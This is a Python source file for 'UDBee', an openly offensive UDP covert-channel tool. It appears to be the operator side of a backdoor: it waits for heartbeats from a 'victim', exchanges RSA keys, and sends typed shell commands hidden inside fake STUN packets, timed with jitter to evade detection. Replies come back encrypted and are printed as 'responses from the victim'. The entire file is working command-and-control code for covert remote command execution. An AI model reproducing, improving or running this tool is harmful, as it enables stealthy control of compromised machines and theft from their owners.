import rsa, socket, random, time, sys, threading, argparse, base64, struct, html
from decryption import decrypt_message
from encryption import encrypt_message
from message_fragmentation import fragment_message
from stun import build_stun_message
from prompt_toolkit import prompt
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.shortcuts import print_formatted_text
from dummy_packets import send_dummy_stun
from check_missing import check_missing_packets

# Logging helpers for consistent output
def log_info(msg): print_formatted_text(HTML(f"<ansiyellow>[ INFO ]</ansiyellow> {msg}"))
def log_error(msg): print_formatted_text(HTML(f"<ansired>[ ERR ]</ansired> {msg}"))
def log_success(msg): print_formatted_text(HTML(f"<ansigreen>[ SUCCESS ]</ansigreen> {msg}"))
def log_warn(msg): print_formatted_text(HTML(f"<ansiyellow>[ WARN ]</ansiyellow> {msg}"))

# Argument parsing for user configuration
parser = argparse.ArgumentParser(description="UDBee - UDP Covert Channel Tool")
parser.add_argument("-ip", required=True, type=str, help="Target IP address, IPv4 only")
parser.add_argument("--chunk-size", type=int, default=256, help="Outbound chunks size, default is 256 byte")
parser.add_argument("--received-chunks", type=int, default=10, help="Received chunks size in KB unit, default is 10KB byte (make it low to avoid memory overflow)")
parser.add_argument("-delay", type=float, default=round((random.uniform(0, 3)), 1), help="Delay between fragments, default is a float number between 0 and 3")
parser.add_argument("-buffer", type=float, default=10000, help="Fragments buffer, default is 10000 (to prevent memory overflow)")
parser.add_argument("-jitter", type=float, default=0.2, help="Random +/- jitter to apply on each fragment delay")

args = parser.parse_args()

my_ip = "0.0.0.0"
my_port = 27381
SERVER = (my_ip, my_port)
target_ip = args.ip
target_port = None
chunk_size = args.chunk_size
delay = args.delay
received_chunk_size = args.received_chunks * 1024  # Convert KB to bytes
buffer_size = args.buffer
max_data_allowed = buffer_size * received_chunk_size  # Maximum data size allowed in the buffer
jitter = args.jitter
target_pub_key = None
my_pub_key = None
my_priv_key = None
transmitted_messages = 0
exchanged_keys = False # Default False, changed when initianting a keys exchange, used to know when to encrypt and when to not
received_chunks = {}
expected_chunks = None
total_data_received = 0
last_received_time = None
resends_requests = 0
sent_chunks = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Parses a string representation of an RSA public key
def parse_public_key(text: str) -> rsa.PublicKey:
    try:
        text = text.replace("PublicKey(", "").replace(")", "")
        n_str, e_str = text.split(",")
        n = int(n_str.strip())
        e = int(e_str.strip())
        return rsa.PublicKey(n, e)
    except:
        return None

def exchange_keys():
    global my_priv_key, my_pub_key, transmitted_messages
    try:
        if target_port:
            ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
            chunks = fragment_message(my_pub_key, chunk_size)
            for chunk in chunks:
                chunk = build_stun_message(chunk)
                sock.sendto(chunk, (target_ip, target_port))
                transmitted_messages+=1
        else:
            log_error(f"<ansired>Target port is not detected, wait until receive a heartbeat from the target.</ansired>")
            return
    except Exception as e:
        log_error(f"<ansired>Target is unreachable.\n{e}</ansired>")
        return



def send_msg(message, is_cached: bool):
    sent_chunks = {}
    global transmitted_messages
    try:
        message = str(message)
        if target_pub_key:
            message = encrypt_message(message, target_pub_key)["message"]
            message = base64.b64encode(message.encode("utf8")).decode('utf8')
        chunks = fragment_message(message, chunk_size)
        # if random.choice([False, True]):
        #     send_dummy_stun(target_ip, target_port, target_pub_key, chunk_size, delay, jitter)
        i = 0
        for chunk in chunks:
            chunk = build_stun_message(chunk)
            if is_cached:
                sent_chunks[i] = chunk
                i+=1
            sock.sendto(chunk, (target_ip, target_port))
            transmitted_messages+=1
            jitter_delay = delay + random.uniform(-jitter, jitter)
            jitter_delay = max(0, jitter_delay)
            time.sleep(jitter_delay)
    except Exception as e:
        log_error(str(e))


def timeout_checker():
    global received_chunks, expected_chunks, last_received_time, resends_requests
    while True:
        if last_received_time is not None:
            if resends_requests < 3:
                try:
                    if expected_chunks and (len(received_chunks) > 0) and ((time.time() - last_received_time) > 3):
                        missing_packets = check_missing_packets(received_chunks, expected_chunks)
                        if missing_packets:
                            log_info(f"<ansiyellow>Received an incomplete response from the vicim, asking victim for {len(missing_packets)} missing packets</ansiyellow>")
                            msg = "missing "
                            counter = 0
                            for i in missing_packets:
                                msg+=str(i)
                                if counter != (len(missing_packets) - 1):
                                    msg+=","
                                counter += 1
                            sock.sendto(build_stun_message(msg), (target_ip, target_port))
                            resends_requests+=1
                            time.sleep(5)
                            continue
                except Exception as e:
                    log_error(str(e))
            else:
                log_error("<ansired>Received an incomplete response from the vicim, tried 3 times to request the missing packets but didn't receive them, IGNORING THE RESPONSE!</ansired>")
                resends_requests = 0
                last_received_time = None
                received_chunks = {}
                expected_chunks = None
        time.sleep(0.5)
    time.sleep(0.5)


def listener():
    global transmitted_messages, my_pub_key, my_priv_key, target_port, target_pub_key, exchanged_keys, sent_chunks, received_chunks, expected_chunks, total_data_received, last_received_time,  resends_requests
    
    while True:
        try:
            sock.bind(SERVER)
            log_success(f"<ansigreen>Binded successfully on {SERVER}</ansigreen>")
            break
        except:
            continue
    while True:
        try:
            data, addr = sock.recvfrom(4096)
            packet_length = len(data)
            total_data_received+=packet_length
            transmitted_messages+=1

            if packet_length < 20:
                continue
            if packet_length > received_chunk_size:
                log_info(f"<ansiyellow>Ignored a {packet_length/1024}KB long packet, there maybe a possible attack.</ansiyellow>")
                continue

            if total_data_received >= max_data_allowed:
                log_info(f"<ansiyellow>Data received is beyond max data allowed ({total_data_received/max_data_allowed}), there maybe a possible attack, stopping tool now.</ansiyellow>")
                return
            
            if len(received_chunks) >= buffer_size:
                log_info(f"<ansiyellow>The buffer is full ({buffer_size}), there maybe a possible attack, stopping tool now.</ansiyellow>")
                return

            header = data[:20]
            attributes = data[20:]

            if len(attributes) < 4:
                continue

            msg_type, msg_length = struct.unpack('!HH', header[:4])

            magic_cookie = struct.unpack('!I', header[4:8])[0]
            if magic_cookie != 0x2112A442:
                continue

            attr_type, attr_length = struct.unpack('!HH', attributes[:4])

            msg = attributes[4:4+attr_length]
            msg = msg.decode("utf8")

            if msg == "heartbeat":
                ip, port = addr
                target_port = int(port)
                if exchanged_keys == False:
                    exchange_keys()
                continue

            if msg == "ACK":
                sent_chunks = {}
                last_received_time = None
                continue

            if msg.startswith("missing"):
                try:
                    missings = msg.split()[1].split(',')
                    for missing in missings:
                        sock.sendto(sent_chunks[int(missing)], (target_ip, target_port))
                    received_chunks = {}
                    expected_chunks = None
                    continue
                except Exception as e:
                    log_error(str(e))
                    continue

            last_received_time = time.time()
            part, total, index = msg.split("|", 2)
            index = int(index)
            total = int(total)

            received_chunks[index] = part

            if not expected_chunks:
                expected_chunks = total

            if len(received_chunks) == expected_chunks:
                full_msg = "".join(received_chunks[i] for i in sorted(received_chunks))
                
                if full_msg.startswith("PublicKey("):
                    target_pub_key = parse_public_key(full_msg)
                    if not exchanged_keys:
                        log_success(f"<ansigreen>Keys was exchanged successfully, all messages from now is encrypted.</ansigreen>")
                        exchanged_keys = True
                    else:
                        log_success("<ansigreen>Keys was exchanged successfully.</ansigreen>")
                    total_data_received = 0
                    received_chunks = {}
                    expected_chunks = None
                    sent_chunks = {}
                    last_received_time = None
                    continue

                sock.sendto("ACK".encode('utf8'), (target_ip, target_port))
                full_msg = base64.b64decode(full_msg)
                full_msg = decrypt_message(full_msg, my_priv_key)
                if full_msg["status"] == 200:
                    full_msg = html.escape(full_msg["message"])
                else:
                    log_error(full_msg["message"])
                    total_data_received = 0
                    received_chunks = {}
                    expected_chunks = None
                    continue
                log_success(f"<ansigreen>received a response from the victim:</ansigreen>")
                print_formatted_text(HTML(f"<ansigreen>{full_msg}</ansigreen>"))
                total_data_received = 0
                received_chunks = {}
                expected_chunks = None
                resends_requests = 0
                continue

            else:
                pass
        except Exception as e:
            log_error(str(e))



def main():

    with patch_stdout():
        global my_pub_key, my_priv_key, target_pub_key
        # Print logo and intro
        logo = f"""
<ansiyellow>
    █    ██ ▓█████▄  ▄▄▄▄   ▓█████ ▓█████ 
    ██  ▓██▒▒██▀ ██▌▓█████▄ ▓█   ▀ ▓█   ▀ 
    ▓██  ▒██░░██   █▌▒██▒ ▄██▒███   ▒███   
    ▓▓█  ░██░░▓█▄   ▌▒██░█▀  ▒▓█  ▄ ▒▓█  ▄ 
    ▒▒█████▓ ░▒████▓ ░▓█  ▀█▓░▒████▒░▒████▒
    ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░▒▓███▀▒░░ ▒░ ░░░ ▒░ ░
    ░░▒░ ░ ░  ░ ▒  ▒ ▒░▒   ░  ░ ░  ░ ░ ░  ░
    ░░░ ░ ░  ░ ░  ░  ░    ░    ░      ░   
    ░        ░     ░         ░  ░   ░  ░
            ░            ░
</ansiyellow>"""
        print_formatted_text(HTML(logo))
        print_formatted_text(HTML("\t🐝 <ansimagenta>UDBee</ansimagenta> <ansicyan>–</ansicyan> <ansigreen>Because TCP Is Too Mainstream</ansigreen>"))
        print_formatted_text(HTML("\t<ansimagenta>GitHub:</ansimagenta> <ansicyan>@MoMhaidat05</ansicyan>"))
        
        threads = []
        thread = threading.Thread(target=listener)
        thread2 = threading.Thread(target=timeout_checker)
        threads.append(thread)
        threads.append(thread2)
        for t in threads:
            t.start()

        log_error("<ansired>Keys wasn't exchanged, wait until the keys exchange is initiated.</ansired>")
        while not exchanged_keys:
            time.sleep(0.5)

        while True:
            command = prompt(HTML('\n<ansicyan>UDBee</ansicyan> <ansimagenta>> </ansimagenta>')).strip()
            if command.lower() in ["exit", "quit"]:
                print_formatted_text(HTML("<ansigreen>Stopped buzzing :)</ansigreen>"))
                sys.exit(1)

            elif command.lower() == "help":
                print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>my_keys</ansigreen> : <ansiblue>show my public and private keys</ansiblue>\n<ansigreen>target_key</ansigreen> : <ansiblue>show target public key</ansiblue>\n<ansigreen>target_chunk INT</ansigreen> : <ansiblue>control target chunk size (default is 256 bytes)</ansiblue>\n<ansigreen>gey_keys</ansigreen> : <ansiblue>generate a new RSA keys on attacker and client side</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflicts with one of UDBee special commands, just put exec: before the command (e.g. exec:help)</ansiblue>"))
                continue

            elif command.startswith("gen_keys"):
                exchange_keys()
                continue
            elif command.startswith("my_keys"):
                if my_pub_key is None or my_priv_key is None:
                    log_error("<ansired>Encryption keys was not exchanged, please exchange keys first.</ansired>")
                    continue
                log_info(f"<ansiblue>My public key:</ansiblue> <ansigreen>{my_pub_key})</ansigreen>")
                log_info(f"<ansiblue>My private key:</ansiblue> <ansigreen>{my_priv_key}</ansigreen>")
                continue
            elif command.startswith("target_key"):
                if target_pub_key is None:
                    log_error("<ansired>Target public key was not exchanged, please exchange keys first.</ansired>")
                    continue
                log_info(f"<ansiblue>Target public key:</ansiblue> <ansigreen>{target_pub_key}</ansigreen>")
                continue
            elif command.startswith("target_chunk"):
                try:
                    full_command = command.split()
                    if len(full_command) != 2:
                        log_error("<ansired>Invalid command format, use: target_chunk <INT></ansired>")
                        continue
                    chunk_size = int(full_command[1])
                    if chunk_size <= 20:
                        log_error("<ansired>Chunk size must be greater than 20 bytes.</ansired>")
                        continue
                    command_to_send = ''.join(i+' ' for i in full_command)
                    send_msg(command_to_send, False)
                    continue
                except:
                    log_error("<ansired>Chunk size should be an integer.</ansired>")
                    continue
            else:
                # Allow user to force command execution if it conflicts with a special command
                if command.startswith("exec:"):
                    command = command.replace("exec:","")
                if command == "":
                    log_error("<ansired>Command cannot be empty, please provide a valid command.</ansired>")
                    continue
                send_msg(command, True)
                
try:
    main()
except KeyboardInterrupt:
    log_info("<ansiyellow>Exiting on user interrupt (Ctrl+C)</ansiyellow>")
    exit()